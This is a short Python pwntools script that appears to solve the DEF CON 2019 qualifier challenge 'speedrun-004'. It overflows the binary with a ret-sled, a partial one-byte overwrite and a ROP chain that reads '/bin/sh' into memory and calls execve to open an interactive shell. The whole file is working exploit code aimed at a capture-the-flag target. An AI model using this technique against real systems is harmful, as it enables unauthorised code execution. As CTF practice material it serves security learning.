#!/usr/bin/env python
from pwn import *

if len(sys.argv) == 1:
    s = process('./speedrun-004')
else:
    s = remote('speedrun-004.quals2019.oooverflow.io', 31337)

elf = ELF('./speedrun-004')

pop_rdi = 0x400686
pop_rsi = 0x410a93
pop_rdx = 0x44c6b6
pop_rax = 0x415f04
syscall = 0x474f15
read = 0x44a140
ret = 0x400c45

s.sendline('257')
payload = ''
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(elf.bss())
payload += p64(pop_rdx) + p64(0x100)
payload += p64(read)
payload += p64(pop_rax) + p64(0x3b)
payload += p64(pop_rdi) + p64(elf.bss())
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(syscall)
payload = p64(ret) * ((0x100 - len(payload)) / 8) + payload + '\x08'
s.send(payload)

s.send('/bin/sh\0')
s.interactive()
